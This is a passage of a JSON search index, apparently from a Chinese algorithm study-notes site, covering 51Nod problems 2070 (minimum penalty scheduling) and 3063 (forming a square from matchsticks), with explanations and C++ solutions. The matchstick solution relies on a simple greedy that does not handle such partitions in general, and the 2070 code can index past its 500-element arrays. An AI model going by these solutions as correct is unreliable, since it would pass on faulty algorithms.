\u884c\u4e3a n \uff0c\u8868\u793a\u6709 n \u4e2a\u5c0f\u6e38\u620f\uff1b \u7b2c 3 \u884c\u6709 n \u4e2a\u6570\uff0c\u5206\u522b\u8868\u793a\u6e38\u620f 1 \u5230 n \u7684\u89c4\u5b9a\u5b8c\u6210\u671f\u9650\uff1b \u7b2c 4 \u884c\u6709 n \u4e2a\u6570\uff0c\u5206\u522b\u8868\u793a\u6e38\u620f 1 \u5230 n \u4e0d\u80fd\u5728\u89c4\u5b9a\u671f\u9650\u524d\u5b8c\u6210\u7684\u6263\u6b3e\u6570\u3002 1.4. Output # \u8f93\u51fa\u6587\u4ef6\u4ec5 1 \u884c\u3002\u8868\u793a\u5c0f\u4f1f\u80fd\u8d62\u53d6\u6700\u591a\u7684\u94b1\u3002 1.5. Sample Input # 10000 7 4 2 4 3 1 4 6 70 60 50 40 30 20 10 1.6. Sample Output # 9950 1.7. Source # 51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e 2. \u89e3\u8bfb # \u82e5\u5b58\u5728\u89c4\u5b9a\u5b8c\u6210\u671f\u9650 t_i \u76f8\u540c\u7684\u4efb\u52a1\uff0c\u5219\u53ef\u80fd\u4f1a\u51fa\u73b0\u60e9\u7f5a\u3002 \u82e5\u6709\u6570\u5b57 t_e \uff0c\u6ee1\u8db3 1 \\le t_e < \\max(t_i) \u4e14\u5728\u6240\u6709\u4efb\u52a1\u7684\u5b8c\u6210\u671f\u9650\u4e2d\u6ca1\u6709\u51fa\u73b0\uff0c\u90a3\u4e48 \u5bf9\u5b8c\u6210\u671f\u9650 t_i > t_e \u7684\u4efb\u52a1 t_x \uff0c\u5373\u4f7f\u51fa\u73b0\u4e86\u4e00\u6b21\u91cd\u590d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 t_e \u8fd9\u4e2a\u65f6\u95f4\u6765\u5b8c\u6210\u3002 \u82e5\u4efb\u52a1 t_x \u7684\u622a\u6b62\u65f6\u95f4 t_i \u524d\u4e0d\u5b58\u5728\u6ca1\u6709\u51fa\u73b0\u7684\u6570\u5b57 t_e \uff0c\u6216 t_e \u88ab t_i \u4e4b\u524d\u51fa\u73b0\u7684\u91cd\u590d\u4efb\u52a1\u6d88\u8017\u6389\u4e86\uff0c\u90a3\u4e48\u60e9\u7f5a\u51fa\u73b0\u3002 \u60e9\u7f5a\u7684\u6700\u4f18\u9009\u62e9\u65b9\u6848\u4e3a\uff0c\u5c06\u6240\u6709\u4efb\u52a1\u6309\u7167\u60e9\u7f5a\u91d1\u989d w_i \u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u9009\u62e9\u7b2c\u4e00\u4e2a\u7b26\u5408\u622a\u6b62\u65f6\u95f4 t_i \\le t_x \u6761\u4ef6\u7684\u4efb\u52a1\u63a5\u53d7\u60e9\u7f5a\u3002\u5373\u5c06\u73b0\u6709\u91d1\u989d m \u51cf\u53bb w_i \u3002 \u5bf9\u6240\u6709\u89c4\u5b9a\u5b8c\u6210\u671f\u9650 t_i \u76f8\u540c\u7684\u4efb\u52a1\u8fdb\u884c\u5904\u7406\u4ee5\u540e\uff0c\u5373\u53ef\u6c42\u5f97\u7b54\u6848\u3002 3. \u4ee3\u7801 # #include <iostream> #include <map> #include <math.h> #include <string.h> using namespace std; // \u8bb0\u5f55\u6700\u665a\u5b8c\u6210\u65f6\u95f4 long long timeList[500]; // \u8bb0\u5f55\u60e9\u7f5a long long penalty[500]; // \u8bb0\u5f55\u51fa\u73b0\u6b21\u6570 long long countTime[500]; // \u65f6\u95f4\u5230\u60e9\u7f5a\u7684\u6620\u5c04 multimap<long long, long long> timeToPenalty; // map\u6307\u9488 multimap<long long, long long>::iterator iter; // \u5c06\u524d\u9762\u8f6e\u7a7a\u7684time\u6b21\u6570\u5b58\u50a8\u8d77\u6765 long long storage; int main() { long long m, n, maxTime; // \u8bfb\u5165m scanf(\"%lld\", &m); // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6570\u7ec4 memset(timeList, 0, sizeof(timeList)); memset(penalty, 0, sizeof(penalty)); memset(countTime, 0, sizeof(countTime)); // \u521d\u59cb\u5316\u6700\u5927\u503c maxTime = 0; // \u521d\u59cb\u5316\u5b58\u50a8 storage = 0; // \u5b58\u50a8\u65f6\u95f4 for (long long i = 0; i < n; i++) { // \u8bfb\u5165\u65f6\u95f4 scanf(\"%lld\", &timeList[i]); // \u5b58\u50a8\u65f6\u95f4\u7684\u51fa\u73b0\u6b21\u6570 countTime[timeList[i]]++; // max maxTime = max(maxTime, timeList[i]); } // \u5b58\u50a8\u60e9\u7f5a for (long long i = 0; i < n; i++) { // \u8bfb\u5165\u60e9\u7f5a scanf(\"%lld\", &penalty[i]); // \u5b58\u5165map timeToPenalty.insert(make_pair(penalty[i], timeList[i])); } // \u5224\u65ad\u662f\u5426\u6709\u91cd\u590d\u5143\u7d20 for (long long i = 1; i <= maxTime; i++) { // \u5148\u6d88\u8017\u5b58\u50a8 if (countTime[i] > 1 && storage > 0) { int countMark = countTime[i] - 1; for (int j = 0; j < countMark; j++) { countTime[i]--; storage--; if (storage <= 0) { break; } } } // \u82e5\u6709\u91cd\u590d\u65f6\u95f4 if (countTime[i] > 1) { // \u5c06penalty\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u904d\u5386 for (iter = timeToPenalty.begin(); iter != timeToPenalty.end(); iter++) { // \u82e5\u7b26\u5408\u6761\u4ef6 if (iter->second <= i && iter->second != -1) { // \u51cf\u53bbpenalty m -= iter->first; // \u5c06\u5df2\u7ecf\u51cf\u53bb\u7684penalty\u6e05\u9664 iter->second = -1; // countTime-1 countTime[i]--; if (countTime[i] <= 1) { // \u9000\u51fa\u5faa\u73af break; } } } } else if (countTime[i] == 0) { // \u82e5\u6709time\u8f6e\u7a7a\uff0c\u5b58\u50a8\u8d77\u6765 storage++; } } // \u8f93\u51fa printf(\"%lld\", m); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3.51Node 2070 \u6700\u5c0f\u7f5a\u6b3e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#51nod-2070","text":"","title":"51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#_1","text":"51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#12-problem-description","text":"\u5c0f\u4f1f\u62a5\u540d\u53c2\u52a0\u4e2d\u592e\u7535\u89c6\u53f0\u7684\u667a\u529b\u5927\u51b2\u6d6a\u8282\u76ee\u3002\u672c\u6b21\u6311\u6218\u8d5b\u5438\u5f15\u4e86\u4f17\u591a\u53c2\u8d5b\u8005\uff0c\u4e3b\u6301\u4eba\u4e3a\u4e86\u8868\u5f70\u5927\u5bb6\u7684\u52c7\u6c14\uff0c\u5148\u5956\u52b1\u6bcf\u4e2a\u53c2\u8d5b\u8005 m \u5143\u3002\u5148\u4e0d\u8981\u592a\u9ad8\u5174\uff01\u56e0\u4e3a\u8fd9\u4e9b\u94b1\u8fd8\u4e0d\u4e00\u5b9a\u90fd\u662f\u4f60\u7684\uff1f\uff01\u63a5\u4e0b\u6765\u4e3b\u6301\u4eba\u5ba3\u5e03\u4e86\u6bd4\u8d5b\u89c4\u5219\uff1a \u9996\u5148\uff0c\u6bd4\u8d5b\u65f6\u95f4\u5206\u4e3a n \u4e2a\u65f6\u6bb5 (n\u2264500) \uff0c\u5b83\u53c8\u7ed9\u51fa\u4e86\u5f88\u591a\u5c0f\u6e38\u620f\uff0c\u6bcf\u4e2a\u5c0f\u6e38\u620f\u90fd\u5fc5\u987b\u5728\u89c4\u5b9a\u671f\u9650 t_i \u524d\u5b8c\u6210 (1 \\le t_i \\le n) \u3002\u5982\u679c\u4e00\u4e2a\u6e38\u620f\u6ca1\u80fd\u5728\u89c4\u5b9a\u671f\u9650\u524d\u5b8c\u6210\uff0c\u5219\u8981\u4ece\u5956\u52b1\u8d39 m \u5143\u4e2d\u6263\u53bb\u4e00\u90e8\u5206\u94b1 w_i \uff0c w_i \u4e3a\u81ea\u7136\u6570\uff0c\u4e0d\u540c\u7684\u6e38\u620f\u6263\u53bb\u7684\u94b1\u662f\u4e0d\u4e00\u6837\u7684\u3002\u73b0\u5728\u4f60\u8981\u8bbe\u8ba1\u65b9\u6cd5\uff0c\u4f7f\u5f97\u4f60\u80fd\u5f97\u5230\u6700\u591a\u7684\u5956\u52b1\u3002","title":"1.2. Problem Description"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#13-input","text":"\u8f93\u5165\u5171 4 \u884c \u7b2c 1 \u884c\u4e3a m \uff0c\u8868\u793a\u4e00\u5f00\u59cb\u5956\u52b1\u7ed9\u6bcf\u4f4d\u53c2\u8d5b\u8005\u7684\u94b1\uff1b \u7b2c 2 \u884c\u4e3a n \uff0c\u8868\u793a\u6709 n \u4e2a\u5c0f\u6e38\u620f\uff1b \u7b2c 3 \u884c\u6709 n \u4e2a\u6570\uff0c\u5206\u522b\u8868\u793a\u6e38\u620f 1 \u5230 n \u7684\u89c4\u5b9a\u5b8c\u6210\u671f\u9650\uff1b \u7b2c 4 \u884c\u6709 n \u4e2a\u6570\uff0c\u5206\u522b\u8868\u793a\u6e38\u620f 1 \u5230 n \u4e0d\u80fd\u5728\u89c4\u5b9a\u671f\u9650\u524d\u5b8c\u6210\u7684\u6263\u6b3e\u6570\u3002","title":"1.3. Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#14-output","text":"\u8f93\u51fa\u6587\u4ef6\u4ec5 1 \u884c\u3002\u8868\u793a\u5c0f\u4f1f\u80fd\u8d62\u53d6\u6700\u591a\u7684\u94b1\u3002","title":"1.4. Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#15-sample-input","text":"10000 7 4 2 4 3 1 4 6 70 60 50 40 30 20 10","title":"1.5. Sample Input"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#16-sample-output","text":"9950","title":"1.6. Sample Output"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#17-source","text":"51Nod 2070 \u6700\u5c0f\u7f5a\u6b3e","title":"1.7. Source"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#2","text":"\u82e5\u5b58\u5728\u89c4\u5b9a\u5b8c\u6210\u671f\u9650 t_i \u76f8\u540c\u7684\u4efb\u52a1\uff0c\u5219\u53ef\u80fd\u4f1a\u51fa\u73b0\u60e9\u7f5a\u3002 \u82e5\u6709\u6570\u5b57 t_e \uff0c\u6ee1\u8db3 1 \\le t_e < \\max(t_i) \u4e14\u5728\u6240\u6709\u4efb\u52a1\u7684\u5b8c\u6210\u671f\u9650\u4e2d\u6ca1\u6709\u51fa\u73b0\uff0c\u90a3\u4e48 \u5bf9\u5b8c\u6210\u671f\u9650 t_i > t_e \u7684\u4efb\u52a1 t_x \uff0c\u5373\u4f7f\u51fa\u73b0\u4e86\u4e00\u6b21\u91cd\u590d\uff0c\u4e5f\u53ef\u4ee5\u4f7f\u7528 t_e \u8fd9\u4e2a\u65f6\u95f4\u6765\u5b8c\u6210\u3002 \u82e5\u4efb\u52a1 t_x \u7684\u622a\u6b62\u65f6\u95f4 t_i \u524d\u4e0d\u5b58\u5728\u6ca1\u6709\u51fa\u73b0\u7684\u6570\u5b57 t_e \uff0c\u6216 t_e \u88ab t_i \u4e4b\u524d\u51fa\u73b0\u7684\u91cd\u590d\u4efb\u52a1\u6d88\u8017\u6389\u4e86\uff0c\u90a3\u4e48\u60e9\u7f5a\u51fa\u73b0\u3002 \u60e9\u7f5a\u7684\u6700\u4f18\u9009\u62e9\u65b9\u6848\u4e3a\uff0c\u5c06\u6240\u6709\u4efb\u52a1\u6309\u7167\u60e9\u7f5a\u91d1\u989d w_i \u4ece\u5c0f\u5230\u5927\u6392\u5e8f\uff0c\u9009\u62e9\u7b2c\u4e00\u4e2a\u7b26\u5408\u622a\u6b62\u65f6\u95f4 t_i \\le t_x \u6761\u4ef6\u7684\u4efb\u52a1\u63a5\u53d7\u60e9\u7f5a\u3002\u5373\u5c06\u73b0\u6709\u91d1\u989d m \u51cf\u53bb w_i \u3002 \u5bf9\u6240\u6709\u89c4\u5b9a\u5b8c\u6210\u671f\u9650 t_i \u76f8\u540c\u7684\u4efb\u52a1\u8fdb\u884c\u5904\u7406\u4ee5\u540e\uff0c\u5373\u53ef\u6c42\u5f97\u7b54\u6848\u3002","title":"2. \u89e3\u8bfb"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/3.51Node_2070_%E6%9C%80%E5%B0%8F%E7%BD%9A%E6%AC%BE/#3","text":"#include <iostream> #include <map> #include <math.h> #include <string.h> using namespace std; // \u8bb0\u5f55\u6700\u665a\u5b8c\u6210\u65f6\u95f4 long long timeList[500]; // \u8bb0\u5f55\u60e9\u7f5a long long penalty[500]; // \u8bb0\u5f55\u51fa\u73b0\u6b21\u6570 long long countTime[500]; // \u65f6\u95f4\u5230\u60e9\u7f5a\u7684\u6620\u5c04 multimap<long long, long long> timeToPenalty; // map\u6307\u9488 multimap<long long, long long>::iterator iter; // \u5c06\u524d\u9762\u8f6e\u7a7a\u7684time\u6b21\u6570\u5b58\u50a8\u8d77\u6765 long long storage; int main() { long long m, n, maxTime; // \u8bfb\u5165m scanf(\"%lld\", &m); // \u8bfb\u5165n scanf(\"%lld\", &n); // \u521d\u59cb\u5316\u6570\u7ec4 memset(timeList, 0, sizeof(timeList)); memset(penalty, 0, sizeof(penalty)); memset(countTime, 0, sizeof(countTime)); // \u521d\u59cb\u5316\u6700\u5927\u503c maxTime = 0; // \u521d\u59cb\u5316\u5b58\u50a8 storage = 0; // \u5b58\u50a8\u65f6\u95f4 for (long long i = 0; i < n; i++) { // \u8bfb\u5165\u65f6\u95f4 scanf(\"%lld\", &timeList[i]); // \u5b58\u50a8\u65f6\u95f4\u7684\u51fa\u73b0\u6b21\u6570 countTime[timeList[i]]++; // max maxTime = max(maxTime, timeList[i]); } // \u5b58\u50a8\u60e9\u7f5a for (long long i = 0; i < n; i++) { // \u8bfb\u5165\u60e9\u7f5a scanf(\"%lld\", &penalty[i]); // \u5b58\u5165map timeToPenalty.insert(make_pair(penalty[i], timeList[i])); } // \u5224\u65ad\u662f\u5426\u6709\u91cd\u590d\u5143\u7d20 for (long long i = 1; i <= maxTime; i++) { // \u5148\u6d88\u8017\u5b58\u50a8 if (countTime[i] > 1 && storage > 0) { int countMark = countTime[i] - 1; for (int j = 0; j < countMark; j++) { countTime[i]--; storage--; if (storage <= 0) { break; } } } // \u82e5\u6709\u91cd\u590d\u65f6\u95f4 if (countTime[i] > 1) { // \u5c06penalty\u4ece\u5c0f\u5230\u5927\u8fdb\u884c\u904d\u5386 for (iter = timeToPenalty.begin(); iter != timeToPenalty.end(); iter++) { // \u82e5\u7b26\u5408\u6761\u4ef6 if (iter->second <= i && iter->second != -1) { // \u51cf\u53bbpenalty m -= iter->first; // \u5c06\u5df2\u7ecf\u51cf\u53bb\u7684penalty\u6e05\u9664 iter->second = -1; // countTime-1 countTime[i]--; if (countTime[i] <= 1) { // \u9000\u51fa\u5faa\u73af break; } } } } else if (countTime[i] == 0) { // \u82e5\u6709time\u8f6e\u7a7a\uff0c\u5b58\u50a8\u8d77\u6765 storage++; } } // \u8f93\u51fa printf(\"%lld\", m); } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"3. \u4ee3\u7801"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/","text":"51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62 # \u76ee\u5f55 # 51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801 1. \u9898\u76ee\u63cf\u8ff0 # 1.1. Limit # Time Limit: 1000 ms Memory Limit: 131072 kB 1.2. Problem Description # \u5c0f\u660e\u5f88\u559c\u6b22\u6b63\u65b9\u5f62\uff0c\u4e5f\u559c\u6b22\u706b\u67f4\uff0c\u73b0\u5728\u5c0f\u660e\u6709\u4e00\u4e9b\u706b\u67f4\uff0c\u73b0\u5728\u5c0f\u660e\u60f3\u77e5\u9053\u7528\u6240\u6709\u7684\u706b\u67f4\u68d2\u80fd\u4e0d\u80fd\u62fc\u6210\u4e00\u4e2a\u6b63\u65b9\u5f62\u3002 1.3. Input # \u7b2c\u4e00\u884c\u4e00\u4e2a\u6570 T \uff0c\u8868\u793a\u6570\u636e\u7684\u7ec4\u6570 (1 \\le T \\le 10) \uff1b \u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\uff0c \u7b2c\u4e00\u884c\u8f93\u5165\u4e00\u4e2a\u6570 n \uff0c\u8868\u793a\u706b\u67f4\u7684\u6570\u76ee\uff0c\u5176\u4e2d 1 \\le n\\le 15 \uff1b \u7b2c\u4e8c\u884c n \u4e2a\u6570\u8868\u793a\u6bcf\u6839\u706b\u67f4\u7684\u957f\u5ea6\uff0c\u5176\u4e2d\u706b\u67f4\u957f\u5ea6\u603b\u548c \\le 10^9 \u3002 1.4. Output # \u5bf9\u4e8e\u6bcf\u7ec4\u6570\u636e\u8f93\u51fa\u4e00\u884c\uff0c\u5982\u679c\u6240\u6709\u7684\u706b\u67f4\u53ef\u4ee5\u62fc\u6210\u6b63\u65b9\u5f62\uff0c\u8f93\u51fa true \uff0c\u5426\u8005\u8f93\u51fa false \u3002 1.5. Sample Input # 1 5 1 1 2 2 2 1.6. Sample Output # true 1.7. Source # 51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62 2. \u89e3\u8bfb # \u8bbe\u706b\u67f4\u957f\u5ea6\u4e3a a_i \uff0c\u9996\u5148\u5bf9\u6240\u6709\u7684\u706b\u67f4\u8fdb\u884c\u6c42\u548c\uff0c\u5f97\u5230 length = \\sum_{i = 1}^n a_i \uff0c\u7136\u540e\u8ba1\u7b97 length \u662f\u5426\u80fd\u88ab 4 \u6574\u9664\uff0c\u82e5\u4e0d\u80fd\uff0c\u8f93\u51fa false \u3002 \u82e5 length \u80fd\u88ab 4 \u6574\u9664\uff0c\u5c06\u6240\u6709\u7684\u706b\u67f4\u964d\u5e8f\u6392\u5e8f\uff0c\u5224\u65ad\u6700\u957f\u7684\u706b\u67f4 \\max a_i \u662f\u5426\u5927\u4e8e length \uff0c\u82e5\u662f\uff0c\u8f93\u51fa false \u3002 \u82e5\u4e0d\u662f\uff0c\u5047\u8bbe\u5f53\u524d\u8fd8\u9700\u8981\u7684\u8fb9\u957f\u957f\u5ea6\u4e3a buffer \uff0c\u5bf9\u6240\u6709\u7684\u706b\u67f4\u8fdb\u884c 4 \u6b21\u964d\u5e8f\u904d\u5386\uff0c\u5982\u679c\u706b\u67f4\u957f\u5ea6 a_i \\le buffer \uff0c\u5219\u8be5\u706b\u67f4\u88ab\u9009\u53d6\uff0c buffer = buffer - a_i \uff0c\u5e76\u5c06 a_i \u7f6e\u4e3a 0 \u3002 \u5982\u679c\u6bcf\u6b21\u904d\u5386\u5b8c\u4ee5\u540e buffer \u90fd\u4e3a 0 \uff0c\u5373 4 \u6761\u8fb9\u90fd\u88ab\u706b\u67f4\u62fc\u51d1\u51fa\u6765\u4e86\uff0c\u5219\u8f93\u51fa true \uff0c\u5426\u5219\u8f93\u51fa false \u3002 3. \u4ee3\u7801 # #include <algorithm> #include <iostream> #include <string.h> using namespace std; const int NUM = 15; // \u5b58\u50a8 long long list[NUM]; // \u5b9a\u4e49\u964d\u5e8f\u6392\u5e8f\u89c4\u5219 bool cmp(long long a, long long b) { return a > b; } int main() { // test case int t, n; scanf(\"%d\", &t); // sum \u5b58\u50a8\u6240\u6709\u706b\u67f4\u7684\u6c42\u548c long long sum; // flag \u5b58\u50a8\u7ed3\u679c bool flag; // buffer long long buffer, inputBuffer; // length \u5b58\u50a8\u6b63\u65b9\u5f624\u6761\u8fb9\u7684\u957f\u5ea6 long long length; // \u8f93\u5165 for (int i = 0; i < t; i++) { // \u521d\u59cb\u5316 memset(list, 0, sizeof(list)); sum = 0; flag = true; // \u8f93\u5165 scanf(\"%d\", &n); for (int j = 0; j < n; j++) { scanf(\"%lld\", &inputBuffer); list[j] = inputBuffer; // \u7d2f\u52a0 sum += inputBuffer; } // \u964d\u5e8f\u6392\u5e8f sort(list, list + n, cmp); // \u8ba1\u7b97 // \u82e5\u4e0d\u80fd\u5206\u4e3a4\u6761\u8fb9 if (sum % 4 != 0 || list[0] > sum / 4) { flag = false; } else { // \u82e5\u80fd\u591f\u5206\u4e3a4\u6761\u8fb9 // \u8ba1\u7b97\u6bcf\u6761\u8fb9\u7684\u957f\u5ea6 length = sum / 4; for (int j = 0; j < 4; j++) { // \u7528buffer\u5b58\u50a8\u9700\u8981\u7684\u957f\u5ea6 buffer = length; for (int k = 0; k < n; k++) { // \u82e5\u9700\u8981\u7684\u957f\u5ea6\u5927\u4e8e\u706b\u67f4\u957f\u5ea6 if (buffer >= list[k]) { // \u9009\u62e9\u8be5\u6839\u706b\u67f4 buffer -= list[k]; // \u957f\u5ea6\u7f6e\u4e3a0 list[k] = 0; // \u82e5\u9700\u8981\u7684\u957f\u5ea6\u4e3a0\u65f6\u5219\u9000\u51fa\u5faa\u73af if (buffer == 0) { break; } } } // \u82e5\u4e0d\u80fd\u7528\u706b\u67f4\u51d1\u51fa\u9700\u8981\u7684\u8fb9\u957f if (buffer > 0) { flag = false; break; } } } // \u8f93\u51fa printf(\"%s\\n\", flag ? \"true\" : \"false\"); } } \u8054\u7cfb\u90ae\u7bb1\uff1acurren_wong@163.com Github\uff1a https://github.com/CurrenWong \u6b22\u8fce\u8f6c\u8f7d/Star/Fork\uff0c\u6709\u95ee\u9898\u6b22\u8fce\u901a\u8fc7\u90ae\u7bb1\u4ea4\u6d41\u3002","title":"4.51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#51nod-3063","text":"","title":"51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#_1","text":"51Nod 3063 \u5c0f\u660e\u7231\u6b63\u65b9\u5f62 \u76ee\u5f55 1. \u9898\u76ee\u63cf\u8ff0 1.1. Limit 1.2. Problem Description 1.3. Input 1.4. Output 1.5. Sample Input 1.6. Sample Output 1.7. Source 2. \u89e3\u8bfb 3. \u4ee3\u7801","title":"\u76ee\u5f55"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#1","text":"","title":"1. \u9898\u76ee\u63cf\u8ff0"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#11-limit","text":"Time Limit: 1000 ms Memory Limit: 131072 kB","title":"1.1. Limit"},{"location":"%E7%AE%97%E6%B3%95%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/%E5%88%B7%E9%A2%98%E7%AC%94%E8%AE%B0/%E7%AE%80%E5%8D%95%E9%A2%98/4.51Nod_3063_%E5%B0%8F%E6%98%8E%E7%88%B1%E6%AD%A3%E6%96%B9%E5%BD%A2/#12-problem-description","text":"\u5c0f\u660e\u5f88\u559c\u6b22\u6b63\u65b9\u5f62\uff0c\u4e5f\u559c\u6b22\u706b\u67f4\uff0c\u73b0\u5728\u5c0f\u660e\u6709\u4e00\u4e9b\u706b\u67f4\uff0c\u73b0\u5728\u5c0f\u660e\u60f3\u77e5\u9053\u7528\u6240\u6709\u7684\u706b\u67f4\u68d2\u80fd\u4e0d\u80fd\u62fc\u6210\u4e00\u4e2a\u6b63\u65b9\u5f62\u3002","title":"1.2. Problem 